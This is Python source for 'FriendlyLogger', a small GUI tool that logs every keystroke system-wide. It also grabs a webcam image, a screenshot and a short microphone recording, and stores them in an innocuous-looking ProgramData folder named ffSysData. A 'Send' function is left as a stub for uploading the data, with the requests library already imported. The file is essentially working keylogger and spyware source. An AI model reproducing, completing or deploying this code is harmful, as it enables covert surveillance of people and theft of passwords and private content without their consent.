from PIL import ImageGrab
from appJar import gui
from time import strftime, gmtime, time
from pynput.keyboard import Key, Listener
from array import array
from sys import byteorder
import cv2
import pyaudio
import wave
import base64
import threading
import requests
import os
import errno
import subprocess

CHUNK = 1024
FORMAT = pyaudio.paInt16
RATE = 44100
RECORD_SECONDS = 4      ## 4=14s ?
WAVE_OUTPUT_FILENAME = "wof.wav"
IMG_CAM_FILENAME = "icf.png"
DATA_DIR = os.path.join(os.getenv('programdata'), 'ffSysData\\')
IMG_SS_FILENAME = "ss.png"
KEYS_TO_SEND = 120
FILE_INDEX = 0
frames = []
keys = []

time_start = time()

try:
    os.makedirs(DATA_DIR)
except OSError as e:
    if e.errno != errno.EEXIST:
        raise

def getMedia():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    cv2.imwrite(DATA_DIR+IMG_CAM_FILENAME, frame)
    cam.release()
    cv2.destroyAllWindows()
    print('Getting screenshot')
    im = ImageGrab.grab()
    fname = "sshot.png"
    im.save(DATA_DIR+IMG_SS_FILENAME, 'png')
    print('Data saved')

##        silent = False ## https://stackoverflow.com/questions/892199/detect-record-audio-in-python    

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
            channels=2,
            rate=RATE,
            input=True,
            frames_per_buffer=CHUNK)
    print('Recording audio')
    
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    print("Done recording")
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(DATA_DIR+WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(2)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    
def sendData():
    ## here some code for a request
    print('Sending succesful')
    
def onPress(key):
    try: k = key.char # single-char keys
    except: k = key.name # other keys
    if key == Key.esc: return False # stop listener
    keys.append(k)
    print("Key pressed: " + k + " " + strftime("%Y-%m-%d %H:%M:%S", gmtime()))

#callback for appJar
def buttonPress(button):
    if button == "Collect":
        print('Running for: '+str(time() - time_start)+'\n collecting...')
        threading.Timer(1, getMedia).start()
        #subprocess.Popen(DATA_DIR) #problem
        app.setLabel("actkey", "Collecting in dir: ")
        app.setLabel("value", str(DATA_DIR))
    elif button == "Send":
        print('Running for: '+str(time() - time_start)+'\n sending...')
        threading.Timer(7, sendData).start() # temporary solution, not bounded
        
        app.setLabel("actkey", "Keys written: ")
        app.setLabel("value", ''.join(keys))
        del keys[:]
    elif button == "Info":
        print("Info about software")
        app.setLabel("actkey", "For more info visit:")
        app.setLabel("value", "http://adamprogrammer.com")
    else:
        keyListener.stop()
        app.stop()
        
        print("the end")
        
# create a GUI variable called app
app = gui("FriendlyLogger", "800x400")
app.setBg("black")
app.setFont(18)

# add & configure widgets - widgets get a name, to help referencing them later
app.addLabel("title", "FriendlyLogger v.0.1", None, 0, 0, 0)
app.addLabel("actkey","Last keys:", None, 0, 0, 0)
app.addLabel("value","no input", None, 0,0,0)
app.setLabelBg("title", "black",)
app.setLabelBg("value", "black",)
app.setLabelBg("actkey", "black")
app.setLabelFg("title", "purple")
app.setLabelFg("value", "blue")
app.setLabelFg("actkey", "green")

# link the buttons 
app.addButtons(["Collect", "Send", "Info", "Exit"], buttonPress)
#other stuff
app.setResizable(canResize=False)
#run appJar gui
keyListener = Listener(on_press=onPress,on_release=None)
keyListener.start()
keyListener.join(app.go())
